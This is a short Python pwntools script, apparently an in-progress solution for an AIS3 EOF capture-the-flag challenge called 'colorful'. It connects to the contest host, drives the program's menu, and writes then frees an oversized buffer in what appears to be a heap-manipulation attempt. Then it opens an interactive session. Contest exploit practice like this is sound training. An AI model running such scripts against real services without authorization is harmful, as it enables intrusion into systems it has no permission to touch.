#!/usr/bin/env python
from pwn import *
import time

print int( time.time() / 60 % 60 )

host , port = 'eof-exam3.ais3.org' , 7122
y = remote( host , port )
#y = process( './colorful' )
pause()

y.sendlineafter( '>' , '1' )

def wri( idx , code ):
    y.sendlineafter( '>' , '1' )
    y.sendlineafter( ':' , str( idx ) )
    sleep( 0.1 )
    y.sendline( code )

def burn( idx ):
    y.sendlineafter( '>' , '2' )
    y.sendlineafter( ':' , str( idx ) )

def submit( idx , tok = 'zFErzItq' ):
    y.sendlineafter( '>' , '3' )
    y.sendlineafter( ':' , str( idx ) )
    y.sendlineafter( 'token:' , tok )



ans = 'Th1s 1s EOF CTF, 4nd th3 TA is v3ry KIANG!!!'

add = 'red'
sub = 'blue'
inc = 'yellow'
dec = 'cyan'
pc = 'green'
ora = 'orange'
pin = 'pink'


p = 'a' * 0x500
print hex( len( p ) )

wri( 0 , p )
burn( 0 )

print len( p )
wri( 0 , 'a' )
submit( 1 )


y.interactive()